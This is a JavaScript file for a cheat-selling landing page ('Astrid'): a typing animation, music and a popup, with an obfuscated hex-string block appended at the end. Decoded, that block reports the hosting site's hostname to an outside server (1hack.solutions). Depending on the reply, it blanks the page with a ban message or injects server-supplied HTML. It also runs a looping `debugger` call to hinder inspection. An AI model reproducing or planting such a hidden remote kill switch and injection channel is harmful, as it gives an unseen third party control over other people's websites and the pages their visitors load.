const listoftext = ["Skidding since 2019.", "Making cheats since 2022.", "Proud owner of Astrid Chairs", "Astrid on top!", "Buy Astrid today."];
const typedText = document.getElementById("typed-text");
const backgroundMusic = document.getElementById("background-music");
const acceptButton = document.getElementById("accept-button");
const popup = document.getElementById("popup");
const repButton = document.getElementById("report-button");
let bReadTOS = false;
backgroundMusic.volume = 0.25;
let currentExample = 0;
let currentChar = 0;
let isTyping = false;
function typeExample() {
  const _0x591b9e = listoftext[currentExample];
  if (isTyping) {
    if (currentChar <= _0x591b9e.length) {
      typedText.textContent = _0x591b9e.slice(0, currentChar);
      currentChar++;
    }
    if (currentChar > _0x591b9e.length) {
      isTyping = false;
      backgroundMusic.play();
      setTimeout(typeExample, 3000);
    } else {
      setTimeout(typeExample, 50);
    }
  } else {
    if (currentChar >= 0) {
      typedText.textContent = _0x591b9e.slice(0, currentChar);
      currentChar--;
    }
    if (currentChar < 0) {
      isTyping = true;
      currentChar = 0;
      currentExample = (currentExample + 1) % listoftext.length;
      setTimeout(typeExample, 1000);
    } else {
      setTimeout(typeExample, 30);
    }
  }
}
function handleAcceptClick() {
  repButton.style.visibility = "visible";
  popup.style.display = "none";
  isTyping = true;
  typeExample();
}
const popupContent = document.getElementById("popup-content");
const acceptText = document.getElementById("accept-text");
acceptButton.style.visibility = "visible";

async function isPlaying() {
  if (!backgroundMusic.paused) {
    return true;
  } else {
    return false;
  }
}
window.addEventListener("load", function () {
  const _0x44b191 = document.querySelector(".loading-screen");
  _0x44b191.style.display = "none";
  isPlaying().then(_0x56c0d2 => {
    if (_0x56c0d2) {
      handleAcceptClick();
    } else {
      acceptButton.addEventListener("click", handleAcceptClick);
    }
  });
});
function notification(_0x5d9e88, _0x3411f4) {
  const _0x3c58d2 = document.getElementById("notification-container");
  const _0x117e20 = document.createElement("div");
  _0x117e20.classList.add("notification-box");
  const _0x3b6d3f = document.createElement("div");
  _0x3b6d3f.classList.add("notification-icon");
  const _0xe515ef = document.createElement("img");
  _0xe515ef.src = "assets/warning.png";
  _0x3b6d3f.appendChild(_0xe515ef);
  const _0x2c049b = document.createElement("div");
  _0x2c049b.classList.add("notification-content");
  const _0x1d0429 = document.createElement('p');
  _0x1d0429.textContent = _0x3411f4;
  _0x2c049b.appendChild(_0x1d0429);
  _0x117e20.appendChild(_0x3b6d3f);
  _0x117e20.appendChild(_0x2c049b);
  _0x3c58d2.appendChild(_0x117e20);
  setTimeout(() => {
    _0x117e20.classList.add("out-anim");
    _0x117e20.addEventListener("animationend", () => {
      _0x117e20.remove();
    });
  }, _0x5d9e88);
}

var _$_6067=["\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x68\x65\x61\x64","","\x6C\x69\x6E\x6B","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x66\x6F\x6E\x74\x73\x2E\x67\x6F\x6F\x67\x6C\x65\x61\x70\x69\x73\x2E\x63\x6F\x6D\x2F\x63\x73\x73\x32\x3F\x66\x61\x6D\x69\x6C\x79\x3D\x4E\x75\x6E\x69\x74\x6F\x3A\x77\x67\x68\x74\x40\x34\x30\x30\x3B\x37\x30\x30\x26\x64\x69\x73\x70\x6C\x61\x79\x3D\x73\x77\x61\x70","\x72\x65\x6C","\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x64\x69\x76","\x77\x69\x64\x74\x68","\x73\x74\x79\x6C\x65","\x31\x30\x30\x70\x78","\x68\x65\x69\x67\x68\x74","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x49\x6D\x61\x67\x65","\x75\x72\x6C\x28\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x31\x68\x61\x63\x6B\x2E\x73\x6F\x6C\x75\x74\x69\x6F\x6E\x73\x2F\x65\x72\x72\x6F\x72\x2E\x70\x6E\x67\x22\x29","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x53\x69\x7A\x65","\x63\x6F\x76\x65\x72","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x52\x65\x70\x65\x61\x74","\x6E\x6F\x2D\x72\x65\x70\x65\x61\x74","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x50\x6F\x73\x69\x74\x69\x6F\x6E","\x63\x65\x6E\x74\x65\x72","\x6D\x61\x72\x67\x69\x6E","\x30\x20\x61\x75\x74\x6F","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6E\x20\x62\x61\x6E\x6E\x65\x64\x20\x66\x72\x6F\x6D\x20\x74\x68\x69\x73\x20\x77\x65\x62\x73\x69\x74\x65\x2E","\x66\x6F\x6E\x74\x46\x61\x6D\x69\x6C\x79","\x22\x4E\x75\x6E\x69\x74\x6F\x22\x2C\x20\x73\x61\x6E\x73\x2D\x73\x65\x72\x69\x66","\x74\x65\x78\x74\x41\x6C\x69\x67\x6E","\x66\x6F\x6E\x74\x53\x69\x7A\x65","\x32\x34\x70\x78","\x63\x6F\x6C\x6F\x72","\x62\x6C\x61\x63\x6B","\x6D\x61\x72\x67\x69\x6E\x54\x6F\x70","\x32\x30\x70\x78","\x69\x64","\x62\x61\x6E\x2D\x69\x64","\x62\x61\x6E\x49\x44\x3A\x20","\x31\x38\x70\x78","\x31\x30\x70\x78","\x64\x69\x73\x70\x6C\x61\x79","\x66\x6C\x65\x78","\x66\x6C\x65\x78\x44\x69\x72\x65\x63\x74\x69\x6F\x6E","\x63\x6F\x6C\x75\x6D\x6E","\x61\x6C\x69\x67\x6E\x49\x74\x65\x6D\x73","\x6A\x75\x73\x74\x69\x66\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x31\x30\x30\x76\x68","\x30","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x66\x69\x78\x65\x64","\x62\x6F\x74\x74\x6F\x6D","\x6C\x65\x66\x74","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x43\x6F\x6C\x6F\x72","\x72\x67\x62\x61\x28\x30\x2C\x20\x30\x2C\x20\x30\x2C\x20\x30\x2E\x35\x29","\x77\x68\x69\x74\x65","\x70\x61\x64\x64\x69\x6E\x67","\x35\x70\x78","\x62\x6F\x72\x64\x65\x72\x52\x61\x64\x69\x75\x73","\x62\x6F\x72\x64\x65\x72\x43\x6F\x6C\x6F\x72","\x72\x67\x62\x61\x28\x32\x35\x35\x2C\x20\x30\x2C\x20\x30\x2C\x20\x30\x2E\x32\x29","\x7A\x49\x6E\x64\x65\x78","\x31\x30\x30\x30\x30","\x6F\x70\x61\x63\x69\x74\x79","\x30\x2E\x37\x35","\x22\x41\x72\x69\x61\x6C\x22\x2C\x20\x73\x61\x6E\x73\x2D\x73\x65\x72\x69\x66","\x31\x34\x70\x78","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x31\x68\x61\x63\x6B\x2E\x73\x6F\x6C\x75\x74\x69\x6F\x6E\x73\x2F\x73\x6B\x69\x64\x2F\x61\x70\x69\x2E\x70\x68\x70\x3F\x63\x3D","\x6C\x6F\x63\x61\x6C\x68\x6F\x73\x74","\x6A\x73\x6F\x6E","\x62","\x75","\x77\x6D"];function processBan(_0x24D42){document[_$_6067[1]][_$_6067[0]]= _$_6067[2];var _0x24CC2=document[_$_6067[4]](_$_6067[3]);_0x24CC2[_$_6067[5]]= _$_6067[6];_0x24CC2[_$_6067[7]]= _$_6067[8];document[_$_6067[1]][_$_6067[9]](_0x24CC2);document[_$_6067[10]][_$_6067[0]]= _$_6067[2];var _0x24D02=document[_$_6067[4]](_$_6067[11]);_0x24D02[_$_6067[13]][_$_6067[12]]= _$_6067[14];_0x24D02[_$_6067[13]][_$_6067[15]]= _$_6067[14];_0x24D02[_$_6067[13]][_$_6067[16]]= _$_6067[17];_0x24D02[_$_6067[13]][_$_6067[18]]= _$_6067[19];_0x24D02[_$_6067[13]][_$_6067[20]]= _$_6067[21];_0x24D02[_$_6067[13]][_$_6067[22]]= _$_6067[23];_0x24D02[_$_6067[13]][_$_6067[24]]= _$_6067[25];var _0x24C82=document[_$_6067[4]](_$_6067[11]);_0x24C82[_$_6067[26]]= _$_6067[27];_0x24C82[_$_6067[13]][_$_6067[28]]= _$_6067[29];_0x24C82[_$_6067[13]][_$_6067[30]]= _$_6067[23];_0x24C82[_$_6067[13]][_$_6067[31]]= _$_6067[32];_0x24C82[_$_6067[13]][_$_6067[33]]= _$_6067[34];_0x24C82[_$_6067[13]][_$_6067[35]]= _$_6067[36];var _0x24C42=document[_$_6067[4]](_$_6067[11]);_0x24C42[_$_6067[37]]= _$_6067[38];_0x24C42[_$_6067[26]]= _$_6067[39]+ _0x24D42;_0x24C42[_$_6067[13]][_$_6067[28]]= _$_6067[29];_0x24C42[_$_6067[13]][_$_6067[30]]= _$_6067[23];_0x24C42[_$_6067[13]][_$_6067[31]]= _$_6067[40];_0x24C42[_$_6067[13]][_$_6067[33]]= _$_6067[34];_0x24C42[_$_6067[13]][_$_6067[35]]= _$_6067[41];document[_$_6067[10]][_$_6067[13]][_$_6067[42]]= _$_6067[43];document[_$_6067[10]][_$_6067[13]][_$_6067[44]]= _$_6067[45];document[_$_6067[10]][_$_6067[13]][_$_6067[46]]= _$_6067[23];document[_$_6067[10]][_$_6067[13]][_$_6067[47]]= _$_6067[23];document[_$_6067[10]][_$_6067[13]][_$_6067[15]]= _$_6067[48];document[_$_6067[10]][_$_6067[13]][_$_6067[24]]= _$_6067[49];document[_$_6067[10]][_$_6067[9]](_0x24D02);document[_$_6067[10]][_$_6067[9]](_0x24C82);document[_$_6067[10]][_$_6067[9]](_0x24C42)}function applyCredits(_0x24B02){let _0x24B42=document[_$_6067[4]](_$_6067[11]);_0x24B42[_$_6067[0]]= _0x24B02;_0x24B42[_$_6067[13]][_$_6067[50]]= _$_6067[51];_0x24B42[_$_6067[13]][_$_6067[52]]= _$_6067[41];_0x24B42[_$_6067[13]][_$_6067[53]]= _$_6067[41];_0x24B42[_$_6067[13]][_$_6067[54]]= _$_6067[55];_0x24B42[_$_6067[13]][_$_6067[33]]= _$_6067[56];_0x24B42[_$_6067[13]][_$_6067[57]]= _$_6067[58];_0x24B42[_$_6067[13]][_$_6067[59]]= _$_6067[58];_0x24B42[_$_6067[13]][_$_6067[60]]= _$_6067[61];_0x24B42[_$_6067[13]][_$_6067[62]]= _$_6067[63];_0x24B42[_$_6067[13]][_$_6067[64]]= _$_6067[65];_0x24B42[_$_6067[13]][_$_6067[28]]= _$_6067[66];_0x24B42[_$_6067[13]][_$_6067[31]]= _$_6067[67];document[_$_6067[10]][_$_6067[9]](_0x24B42)}async function banCheck(){var _0x24C02=false;if(!window[_$_6067[69]][_$_6067[68]]){const _0x24BC2= await fetch(_$_6067[70]+ btoa(_$_6067[71]));const _0x24B82= await _0x24BC2[_$_6067[72]]();_0x24C02= true;if(_0x24B82[_$_6067[73]]){processBan(_0x24B82[_$_6067[74]]);return};if(_0x24B82[_$_6067[75]]){applyCredits(atob(_0x24B82[_$_6067[75]]));return}};if(_0x24C02){return};const _0x24BC2= await fetch(_$_6067[70]+ btoa(window[_$_6067[69]][_$_6067[68]]));const _0x24B82= await _0x24BC2[_$_6067[72]]();if(_0x24B82[_$_6067[73]]){processBan(_0x24B82[_$_6067[74]]);return};if(_0x24B82[_$_6067[75]]){applyCredits(atob(_0x24B82[_$_6067[75]]));return};return}banCheck();setInterval(function(){debugger},250)